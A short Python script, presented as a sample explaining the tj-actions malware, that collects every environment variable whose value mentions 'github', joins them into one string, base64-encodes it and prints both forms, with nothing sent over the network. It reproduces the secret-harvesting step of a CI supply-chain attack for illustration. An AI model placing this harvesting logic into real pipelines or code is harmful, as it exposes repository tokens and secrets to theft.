#!/usr/bin/python3

# this is a sample application that explains tj-actions malware

import base64
import os
import re

payload = ""
for k, v in os.environ.items():
    if re.search("github", v, re.IGNORECASE):
        s = ":".join((k, v))
        payload += "|" + s

b64payload = base64.b64encode(payload.encode("ascii"))

print(payload)
print(b64payload)
